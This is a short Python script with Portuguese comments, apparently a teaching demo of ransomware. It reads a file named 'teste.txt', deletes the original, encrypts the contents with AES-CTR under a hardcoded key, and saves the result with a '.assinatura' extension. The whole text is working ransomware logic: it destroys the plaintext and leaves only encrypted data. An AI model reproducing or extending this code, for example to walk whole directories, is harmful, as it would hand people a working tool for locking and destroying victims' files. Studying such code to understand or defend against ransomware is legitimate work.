import os 
import pyaes

## Abrindo arquivo
file_name = 'teste.txt'
file = open(file_name, 'rb')
file_data = file.read()
file.close()

## Remover arquivo original
os.remove(file_name)

## Cripitografar arquivo 

key =b"testeransomwares" 
aes = pyaes.AESModeOfOperationCTR(key)

## Criptografar o arquivo 
crypto_data = aes.encrypt(file_data)

## Salvar o arquivo criptografado 

new_file = file_name + ".assinatura"
new_file = open(f'{new_file}', 'wb')
new_file.write(crypto_data)
new_file.close()
